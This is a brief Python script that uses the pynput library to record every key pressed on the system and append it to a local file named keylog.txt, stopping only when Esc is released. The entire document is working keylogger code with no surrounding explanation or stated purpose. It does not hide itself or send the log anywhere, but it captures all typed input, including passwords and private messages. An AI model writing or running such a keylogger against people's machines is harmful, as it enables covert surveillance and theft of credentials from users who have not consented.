from pynput import keyboard

def on_press(key):
    try:
        # Log the pressed key
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        # Handle special keys
        with open("keylog.txt", "a") as f:
            f.write(f"{key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
